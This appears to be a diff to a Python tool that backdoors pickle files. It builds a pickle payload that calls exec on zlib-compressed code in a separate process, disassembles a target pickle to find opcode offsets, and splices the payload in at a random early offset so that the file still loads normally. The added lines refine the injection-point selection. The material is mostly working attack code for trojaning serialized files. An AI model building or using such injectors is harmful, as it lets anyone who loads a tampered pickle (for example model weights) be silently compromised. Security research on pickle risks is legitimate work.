@@ -37,33 +37,35 @@ code = b'from multiprocessing import Process\np = Process(target=exec, args=("""
 data = zlib.compress(code,level=9)
 payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')
 
-# dissasemble the target pickle
+# dissasemble the target pickle and get potential locations
 temp = tempfile.TemporaryFile("w+")
+locations = []
 while inf.tell() != os.fstat(inf.fileno()).st_size:
     try:
         pickletools.dis(inf, temp)
+        temp.seek(0)
+        version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
+        temp.seek(0)
+        tempLocations = [location.partition(":")[0] for location in temp.read().split('\n')]
+        for location in tempLocations:
+            try:
+                locations.append((int(location),version))
+            except ValueError as e:
+                pass
     except Exception as e:
         print(e)
         break
 
-# get a list of loctaions and the "highest protocol" from the disassembly
-temp.seek(0)
-locations = temp.read().split('\n')
-temp.seek(0)
-version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
-temp.close()
-
+# pick a random opcode and inject our shellcode before it.
+# since pickle opcodes are location independent and our shellcode cleans up the stack, we can inject anywhere and it shouldn't affect a thing.
+pos = 999
+while pos > 15:
+    pos, version = random.choice(locations)
+    print(pos)
+    
 # append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
 payload.append(version)
 
-# pick a random opcode and inject our shellcode before it.
-# since pickle opcodes are location independent and our shellcode cleans up the stack, we can inject anywhere and it shouldn't affect a thing.
-while pos == None:
-    loc = random.choice(locations)
-    try:
-        pos=int(loc.partition(":")[0])
-    except:
-        print(loc, 'didn\'t work, trying again')
 
 # simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
 inf.seek(0)
